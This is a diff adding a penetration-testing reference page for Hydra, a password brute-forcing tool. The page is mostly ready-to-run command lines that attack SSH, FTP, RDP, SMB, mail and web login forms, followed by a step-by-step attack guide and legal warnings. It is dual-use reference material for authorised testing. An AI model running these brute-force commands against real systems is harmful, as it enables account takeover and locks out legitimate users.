@@ -1,0 +1,117 @@
+Hydra
+Fast and flexible online password cracking tool
+
+Password Attacks
+Description
+Hydra is a parallelized login cracker that supports numerous protocols including FTP, HTTP, HTTPS, SMB, SSH, and many more. It performs rapid dictionary attacks against login pages and services to test password strength.
+
+Installation / Check
+Check if installed:
+
+which hydra
+Install command:
+
+sudo apt install hydra
+Basic Syntax
+hydra -l <user> -P <wordlist> <target> <service>
+Common Commands
+Command	What it does	When to use	Risk
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh
+
+SSH brute force - Attack SSH login	Test SSH passwords	
+hydra -L users.txt -P passwords.txt 192.168.1.1 ftp
+
+FTP attack - Multiple users/passwords	FTP password testing	
+hydra -l admin -P wordlist.txt 192.168.1.1 telnet
+
+Telnet attack - Brute force telnet	Legacy system testing	
+hydra -l root -P wordlist.txt 192.168.1.1 mysql
+
+MySQL attack - Database password test	MySQL authentication	
+hydra -l admin -P wordlist.txt -t 4 192.168.1.1 ssh
+
+Throttled - 4 parallel connections	Avoid lockouts	
+hydra -l admin -P wordlist.txt -V 192.168.1.1 ssh
+
+Verbose - Show each attempt	Debug/monitor	
+hydra -l admin -P wordlist.txt -f 192.168.1.1 ssh
+
+Stop on success - Exit after first match	Quick credential find	
+hydra -l admin -P wordlist.txt -e nsr 192.168.1.1 ssh
+
+Extra checks - null/same/reverse	Check obvious passwords	
+hydra -l admin -P wordlist.txt -o results.txt 192.168.1.1 ssh
+
+Save output - Write results to file	Documentation	
+hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+
+HTTP POST form - Web login attack	Web login testing	
+hydra -l admin -P wordlist.txt 192.168.1.1 http-get-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
+
+HTTP GET form - Query string attack	GET-based logins	
+hydra -l admin -P wordlist.txt 192.168.1.1 https-post-form "/login:user=^USER^&pass=^PASS^:F=failed"
+
+HTTPS POST - Secure web login	HTTPS form testing	
+hydra -C userpass.txt 192.168.1.1 ssh
+
+Combo file - user:pass pairs	Pre-combined credentials	
+hydra -l admin -P wordlist.txt -s 2222 192.168.1.1 ssh
+
+Custom port - Non-standard port	Custom SSH port	
+hydra -M targets.txt -l admin -P wordlist.txt ssh
+
+Multiple targets - Attack several IPs	Batch attack	
+hydra -l admin -P wordlist.txt -w 30 192.168.1.1 ssh
+
+Timeout - 30 sec wait time	Slow networks	
+hydra -l admin -P wordlist.txt 192.168.1.1 rdp
+
+RDP attack - Windows Remote Desktop	Windows RDP testing	
+hydra -l admin -P wordlist.txt 192.168.1.1 smb
+
+SMB attack - Windows shares	SMB authentication	
+hydra -l admin -P wordlist.txt 192.168.1.1 vnc
+
+VNC attack - Remote desktop	VNC password testing	
+hydra -l admin@domain -P wordlist.txt 192.168.1.1 smb
+
+Domain account - Windows domain attack	AD environment	
+hydra -l admin -P wordlist.txt 192.168.1.1 pop3
+
+POP3 attack - Email server	Email password test	
+hydra -l admin -P wordlist.txt 192.168.1.1 imap
+
+IMAP attack - Email server	IMAP authentication	
+hydra -l admin -P wordlist.txt -x 6:8:aA1 192.168.1.1 ssh
+
+Generate passwords - Min:Max:charset	Custom password gen	
+Step-by-Step Guide
+1
+Identify the service to attack (SSH, FTP, HTTP, etc.)
+2
+Prepare your wordlist (rockyou.txt is common)
+3
+Identify username(s) to test
+4
+Run Hydra with appropriate options
+5
+Wait for results - successful logins shown in green
+6
+Stop attack if valid credentials found
+7
+Document findings for your report
+Understanding the Output
+Hydra shows each attempt with [DATA] and successful logins with [PORT][SERVICE] host: IP login: USER password: PASS. A successful crack is highlighted and clearly marked.
+
+Important Warnings
+•
+Password attacks without permission are ILLEGAL
+•
+Most systems have account lockout - you may lock out legitimate users
+•
+Attacks are logged and can be traced back to you
+•
+Only use on systems you own or have written permission to test
+•
+Many organizations consider this a serious security incident
+⚠️ Use Kali Linux tools only on systems you own or have written permission to test. Unauthorized hacking is illegal and can result in criminal charges.
